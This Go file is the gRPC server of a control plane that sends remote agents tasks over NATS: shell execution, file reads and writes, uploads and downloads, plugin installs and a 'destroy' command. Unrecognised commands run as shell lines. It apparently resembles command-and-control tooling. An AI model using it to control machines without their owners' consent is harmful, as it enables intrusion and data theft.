package main

import (
	"context"
	"encoding/hex"
	"encoding/binary"
	"encoding/json"
	"os"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	pb "fei/control-plane/proto"

	"google.golang.org/grpc"
)

type GRPCServer struct {
	pb.UnimplementedFeiControlServiceServer
	cp         *ControlPlane
	listenAddr string
	server     *grpc.Server
}

func NewGRPCServer(cp *ControlPlane, listenAddr string) *GRPCServer {
	return &GRPCServer{
		cp:         cp,
		listenAddr: listenAddr,
	}
}

func (s *GRPCServer) Start() error {
	lis, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return fmt.Errorf("gRPC listen: %w", err)
	}

	s.server = grpc.NewServer()
	pb.RegisterFeiControlServiceServer(s.server, s)

	log.Printf("gRPC server listening on %s", s.listenAddr)
	go func() {
		if err := s.server.Serve(lis); err != nil {
			log.Printf("gRPC serve: %v", err)
		}
	}()

	return nil
}

func (s *GRPCServer) Stop() {
	if s.server != nil {
		s.server.GracefulStop()
	}
}

func (s *GRPCServer) ListAgents(ctx context.Context, req *pb.ListAgentsRequest) (*pb.ListAgentsResponse, error) {
	var agents []*pb.AgentInfo
	s.cp.agents.Range(func(_, value interface{}) bool {
		agent := value.(*Agent)
		agents = append(agents, &pb.AgentInfo{
			Id:        agent.ID,
			Hostname:  agent.Hostname,
			IpAddress: agent.IPAddress,
			OsInfo:    agent.OSInfo,
			LastSeen:  agent.LastSeen.Format("2006-01-02 15:04:05"),
			State:     uint32(agent.State),
		})
		return true
	})

	return &pb.ListAgentsResponse{
		Success: true,
		Agents:  agents,
		Count:   int32(len(agents)),
	}, nil
}

// sandboxFrame builds the agent-sandbox pipe frame: [cmd u8][len u32 LE][data].
// The agent decrypts the payload and forwards it verbatim to the sandbox.
func sandboxFrame(cmd byte, data []byte) []byte {
	buf := make([]byte, 5+len(data))
	buf[0] = cmd
	binary.LittleEndian.PutUint32(buf[1:5], uint32(len(data)))
	copy(buf[5:], data)
	return buf
}

// waitTask polls a task until it completes or the timeout expires.
func (s *GRPCServer) waitTask(taskID string, timeout time.Duration) *Task {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		val, ok := s.cp.tasks.Load(taskID)
		if ok {
			t := val.(*Task)
			if t.Status == TaskCompleted || t.Status == TaskFailed || t.Status == TaskTimeout {
				return t
			}
		}
		time.Sleep(200 * time.Millisecond)
	}
	return nil
}

func (s *GRPCServer) SendCommand(ctx context.Context, req *pb.SendCommandRequest) (*pb.SendCommandResponse, error) {
	if _, ok := s.cp.agents.Load(req.AgentId); !ok {
		return &pb.SendCommandResponse{
			Success: false,
			Error:   fmt.Sprintf("agent %s not found", req.AgentId),
		}, nil
	}

	// Everything except destroy rides the plugin_load channel; the payload
	// is the sandbox pipe frame for the named operation.
	var (
		cmdType uint16 = 0x02
		payload []byte
	)
	arg := func(i int) string {
		if i < len(req.Parameters) {
			return req.Parameters[i]
		}
		return ""
	}
	switch req.Command {
	case "destroy":
		cmdType = 0x05
		payload = nil
	case "sysinfo":
		payload = sandboxFrame(0x01, nil)
	case "process_list", "ps":
		payload = sandboxFrame(0x02, nil)
	case "dir_list", "ls", "list_directory":
		payload = sandboxFrame(0x03, []byte(arg(0)))
	case "file_read", "cat":
		payload = sandboxFrame(0x04, []byte(arg(0)))
	case "file_write", "write":
		// parameters: path, hex-content
		payload = sandboxFrame(0x05, append(append([]byte(arg(0)), 0), arg(1)...))
	case "shell", "execute", "exec":
		full := req.Command
		if req.Command == "shell" {
			full = arg(0)
			for _, p := range req.Parameters[1:] {
				full += " " + p
			}
		} else {
			full = strings.Join(req.Parameters, " ")
		}
		payload = sandboxFrame(0x06, []byte(full))
	default:
		// unknown command: treat as shell line for forward compatibility
		payload = sandboxFrame(0x06, []byte(strings.Join(append([]string{req.Command}, req.Parameters...), " ")))
	}

	taskID, err := s.forwardCommandToAgent(req.AgentId, cmdType, payload)
	if err != nil {
		return &pb.SendCommandResponse{Success: false, Error: err.Error()}, nil
	}

	// short synchronous wait so simple commands return their result inline
	if task := s.waitTask(taskID, 5*time.Second); task != nil && task.Status == TaskCompleted {
		return &pb.SendCommandResponse{
			Success: true,
			TaskId:  taskID,
			Result:  string(task.Result),
		}, nil
	}

	return &pb.SendCommandResponse{
		Success: true,
		TaskId:  taskID,
		Result:  fmt.Sprintf("Command queued, task_id: %s", taskID),
	}, nil
}

func (s *GRPCServer) GetSystemInfo(ctx context.Context, req *pb.GetSystemInfoRequest) (*pb.GetSystemInfoResponse, error) {
	val, ok := s.cp.agents.Load(req.AgentId)
	if !ok {
		return &pb.GetSystemInfoResponse{
			Success: false,
			Error:   "agent not found",
		}, nil
	}

	agent := val.(*Agent)
	return &pb.GetSystemInfoResponse{
		Success: true,
		Agent: &pb.AgentInfo{
			Id:        agent.ID,
			Hostname:  agent.Hostname,
			IpAddress: agent.IPAddress,
			OsInfo:    agent.OSInfo,
			LastSeen:  agent.LastSeen.Format("2006-01-02 15:04:05"),
			State:     uint32(agent.State),
		},
	}, nil
}

func (s *GRPCServer) forwardCommandToAgent(agentID string, cmdType uint16, payload []byte) (string, error) {
	if _, ok := s.cp.agents.Load(agentID); !ok {
		return "", fmt.Errorf("agent %s not found or offline", agentID)
	}

	taskID := s.cp.nextTaskID()
	now := time.Now()
	task := &Task{
		ID:      taskID,
		AgentID: agentID,
		Type:    cmdType,
		Payload: payload,
		Status:  TaskPending,
		Created: now,
		Updated: now,
	}
	s.cp.tasks.Store(taskID, task)
	s.cp.markDirty()

	cmd := map[string]interface{}{
		"type":    cmdType,
		"payload": payload,
		"task_id": taskID,
	}
	cmdData, _ := json.Marshal(cmd)

	subj := fmt.Sprintf("fei.cmd.%s", agentID)
	if err := s.cp.nc.Publish(subj, cmdData); err != nil {
		task.Status = TaskFailed
		task.ErrReason = err.Error()
		task.Updated = time.Now()
		s.cp.markDirty()
		return "", fmt.Errorf("NATS publish failed: %v", err)
	}

	task.Status = TaskSent
	task.Updated = time.Now()
	s.cp.markDirty()

	log.Printf("task %s forwarded to agent %s (type=0x%04x)", taskID, agentID, cmdType)
	return taskID, nil
}

func (s *GRPCServer) GetSystemMetrics(ctx context.Context, req *pb.GetSystemMetricsRequest) (*pb.GetSystemMetricsResponse, error) {
	val, ok := s.cp.agents.Load(req.AgentId)
	if !ok {
		return &pb.GetSystemMetricsResponse{
			Success: false,
			Error:   "agent not found",
		}, nil
	}

	agent := val.(*Agent)
	payload, _ := json.Marshal(map[string]interface{}{
		"action": "system_metrics",
	})

	taskID, err := s.forwardCommandToAgent(req.AgentId, 0x03, payload)
	if err != nil {
		return &pb.GetSystemMetricsResponse{
			Success: false,
			Error:   err.Error(),
		}, nil
	}

	_ = agent
	_ = taskID
	return &pb.GetSystemMetricsResponse{
		Success:     true,
		CpuUsage:    -1,
		MemoryUsage: -1,
		DiskUsage:   -1,
	}, nil
}

func (s *GRPCServer) ListDirectory(ctx context.Context, req *pb.ListDirectoryRequest) (*pb.ListDirectoryResponse, error) {
	payload := sandboxFrame(0x03, []byte(req.Path))

	taskID, err := s.forwardCommandToAgent(req.AgentId, 0x02, payload)
	if err != nil {
		return &pb.ListDirectoryResponse{
			Success: false,
			Error:   err.Error(),
		}, nil
	}

	task := s.waitTask(taskID, 8*time.Second)
	files := []*pb.FileEntry{}
	if task == nil {
		return &pb.ListDirectoryResponse{
			Success: false,
			Error:   fmt.Sprintf("timeout waiting for agent (task %s)", taskID),
			Path:    req.Path,
			Files:   files,
		}, nil
	}
	if task.Status != TaskCompleted {
		return &pb.ListDirectoryResponse{
			Success: false,
			Error:   fmt.Sprintf("task %s: %s", taskID, task.Status),
			Path:    req.Path,
			Files:   files,
		}, nil
	}

	var parsed struct {
		Files []struct {
			Name        string `json:"name"`
			Size        uint64 `json:"size"`
			IsDirectory bool   `json:"is_directory"`
		} `json:"files"`
		Error string `json:"error"`
	}
	if err := json.Unmarshal(task.Result, &parsed); err != nil {
		return &pb.ListDirectoryResponse{
			Success: false,
			Error:   fmt.Sprintf("parse agent response: %v", err),
			Path:    req.Path,
			Files:   files,
		}, nil
	}
	if parsed.Error != "" {
		return &pb.ListDirectoryResponse{
			Success: false,
			Error:   parsed.Error,
			Path:    req.Path,
			Files:   files,
		}, nil
	}
	for _, f := range parsed.Files {
		files = append(files, &pb.FileEntry{
			Name:        f.Name,
			Size:        f.Size,
			IsDirectory: f.IsDirectory,
		})
	}

	return &pb.ListDirectoryResponse{
		Success: true,
		Path:    req.Path,
		Files:   files,
	}, nil
}

// UploadFile: reads the operator-side local file, hex-encodes it and sends a
// sandbox file_write frame. Single-shot (<= ~7KB payload); chunked transfer
// is on the roadmap.
func (s *GRPCServer) UploadFile(ctx context.Context, req *pb.UploadFileRequest) (*pb.UploadFileResponse, error) {
	content, err := os.ReadFile(req.LocalPath)
	if err != nil {
		return &pb.UploadFileResponse{Success: false, Error: err.Error()}, nil
	}
	const maxBytes = 7000
	if len(content) > maxBytes {
		return &pb.UploadFileResponse{
			Success: false,
			Error:   fmt.Sprintf("file too large for single-shot upload (%d > %d bytes); chunked transfer not implemented yet", len(content), maxBytes),
		}, nil
	}

	frame := append(append([]byte(req.RemotePath), 0), []byte(hex.EncodeToString(content))...)
	payload := sandboxFrame(0x05, frame)

	taskID, err := s.forwardCommandToAgent(req.AgentId, 0x02, payload)
	if err != nil {
		return &pb.UploadFileResponse{Success: false, Error: err.Error()}, nil
	}
	if task := s.waitTask(taskID, 8*time.Second); task != nil && task.Status == TaskCompleted {
		return &pb.UploadFileResponse{
			Success: true,
			Message: fmt.Sprintf("uploaded %d bytes: %s -> %s", len(content), req.LocalPath, req.RemotePath),
		}, nil
	}
	return &pb.UploadFileResponse{
		Success: true,
		Message: fmt.Sprintf("Upload task %s queued", taskID),
	}, nil
}

// DownloadFile: sends a sandbox file_read frame and returns the content hex.
func (s *GRPCServer) DownloadFile(ctx context.Context, req *pb.DownloadFileRequest) (*pb.DownloadFileResponse, error) {
	payload := sandboxFrame(0x04, []byte(req.RemotePath))

	taskID, err := s.forwardCommandToAgent(req.AgentId, 0x02, payload)
	if err != nil {
		return &pb.DownloadFileResponse{Success: false, Error: err.Error()}, nil
	}

	task := s.waitTask(taskID, 8*time.Second)
	if task == nil {
		return &pb.DownloadFileResponse{
			Success: false,
			Error:   fmt.Sprintf("timeout waiting for agent (task %s)", taskID),
		}, nil
	}
	if task.Status != TaskCompleted {
		return &pb.DownloadFileResponse{
			Success: false,
			Error:   fmt.Sprintf("task %s: %s", taskID, task.Status),
		}, nil
	}

	var parsed struct {
		ContentHex string `json:"content_hex"`
		Error      string `json:"error"`
	}
	if err := json.Unmarshal(task.Result, &parsed); err != nil {
		return &pb.DownloadFileResponse{Success: false, Error: err.Error()}, nil
	}
	if parsed.Error != "" {
		return &pb.DownloadFileResponse{Success: false, Error: parsed.Error}, nil
	}

	if req.LocalPath != "" {
		raw, err := hex.DecodeString(parsed.ContentHex)
		if err == nil {
			err = os.WriteFile(req.LocalPath, raw, 0644)
		}
		if err != nil {
			return &pb.DownloadFileResponse{Success: false, Error: err.Error()}, nil
		}
		return &pb.DownloadFileResponse{
			Success: true,
			Message: fmt.Sprintf("saved %s (%d bytes)", req.LocalPath, len(raw)),
		}, nil
	}

	return &pb.DownloadFileResponse{
		Success: true,
		Message: parsed.ContentHex,
	}, nil
}

func (s *GRPCServer) ListPlugins(ctx context.Context, req *pb.ListPluginsRequest) (*pb.ListPluginsResponse, error) {
	payload, _ := json.Marshal(map[string]interface{}{
		"action": "list_plugins",
	})

	_, err := s.forwardCommandToAgent(req.AgentId, 0x03, payload)
	if err != nil {
		return &pb.ListPluginsResponse{
			Success: false,
			Error:   err.Error(),
		}, nil
	}

	return &pb.ListPluginsResponse{
		Success: true,
		Plugins: []*pb.PluginInfo{},
	}, nil
}

func (s *GRPCServer) InstallPlugin(ctx context.Context, req *pb.InstallPluginRequest) (*pb.InstallPluginResponse, error) {
	payload, _ := json.Marshal(map[string]interface{}{
		"action":    "install_plugin",
		"plugin_id": req.PluginId,
	})

	taskID, err := s.forwardCommandToAgent(req.AgentId, 0x02, payload)
	if err != nil {
		return &pb.InstallPluginResponse{
			Success: false,
			Error:   err.Error(),
		}, nil
	}

	return &pb.InstallPluginResponse{
		Success: true,
		Message: fmt.Sprintf("Plugin install task %s queued: %s", taskID, req.PluginId),
	}, nil
}

func (s *GRPCServer) UninstallPlugin(ctx context.Context, req *pb.UninstallPluginRequest) (*pb.UninstallPluginResponse, error) {
	payload, _ := json.Marshal(map[string]interface{}{
		"action":    "uninstall_plugin",
		"plugin_id": req.PluginId,
	})

	taskID, err := s.forwardCommandToAgent(req.AgentId, 0x03, payload)
	if err != nil {
		return &pb.UninstallPluginResponse{
			Success: false,
			Error:   err.Error(),
		}, nil
	}

	return &pb.UninstallPluginResponse{
		Success: true,
		Message: fmt.Sprintf("Plugin uninstall task %s queued: %s", taskID, req.PluginId),
	}, nil
}

func (s *GRPCServer) GetTask(ctx context.Context, req *pb.GetTaskRequest) (*pb.GetTaskResponse, error) {
	val, ok := s.cp.tasks.Load(req.TaskId)
	if !ok {
		return &pb.GetTaskResponse{
			Success: false,
			Error:   "task not found",
		}, nil
	}

	task := val.(*Task)
	return &pb.GetTaskResponse{
		Success: true,
		TaskId:  task.ID,
		Status:  string(task.Status),
		Result:  task.Result,
	}, nil
}
